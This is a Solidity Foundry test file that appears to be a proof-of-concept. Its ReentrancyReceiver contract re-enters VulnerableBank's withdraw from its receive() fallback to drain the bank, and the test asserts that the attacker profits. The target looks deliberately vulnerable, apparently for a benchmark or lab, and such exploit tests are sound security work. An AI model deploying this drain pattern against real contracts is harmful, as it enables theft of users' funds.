// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/5efeb9b3-7ea9-49ce-abf9-e297992d533f_VulnerableBank.sol";

contract ReentrancyReceiver {
    VulnerableBank private immutable target;
    uint256 private immutable amount;

    constructor(VulnerableBank target_) {
        target = target_;
        amount = 1 ether;
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function attack() external payable {
        require(msg.value == amount, "incorrect seed");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank public target;
    ReentrancyReceiver public receiver;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        receiver.attack{value: 1 ether}();
        assertGt(address(receiver).balance, 1 ether);
    }
}